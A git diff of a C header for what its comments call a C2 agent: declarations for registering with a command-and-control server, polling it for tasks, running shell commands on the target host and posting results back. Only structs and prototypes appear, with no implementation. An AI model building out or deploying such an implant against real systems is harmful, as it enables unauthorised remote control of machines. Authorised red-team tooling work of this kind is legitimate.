@@ -15,7 +15,6 @@ struct agent_info {
 	char os_type[64];
 	char os_version[64];
 	char tasks_url[64];
-	bool got_tasks_url;
 };
 
 struct strings_array {
@@ -30,6 +29,7 @@ struct tasks {
 	char args[128];
 	char **tasks_array;
 	char *results;
+	char results_url[64];
 	size_t sz;
 	size_t cap;
 };
@@ -45,6 +45,10 @@ bool reg(struct agent_info *agent, struct strings_array *sa);
 // the agent_info struct.
 void create_tasks_url(char *response, struct agent_info *agent);
 
+// Concats agent UUID to base results URL to create complete results URL.
+// Assigns URL value to corresponding field in the agent_info struct.
+void create_results_url(struct agent_info *agent, struct tasks *task);
+
 // Executes GET request to C2 server to check for tasks. 
 bool check_tasks(struct agent_info *agent, struct strings_array *sa);
 
@@ -52,14 +56,14 @@ bool check_tasks(struct agent_info *agent, struct strings_array *sa);
 // fields.
 bool parse_tasks(char *response, struct tasks *task);
 
-// Checks to see if a binary for a provided cmd task exists on the target host.
-bool can_run_cmd(const char *cmd);
-
 // Executes a shell command.
 bool exec_cmd(struct tasks *task);
 
+// Checks to see if a binary for a provided cmd task exists on the target host.
+bool can_run_cmd(const char *cmd);
+
 // Posts task results to C2 server.
-bool post_results(struct tasks *task);
+bool post_results(struct tasks *task, struct strings_array *sa);
 
 // Frees memory for task array of strings.
 void destroy(struct tasks *task);
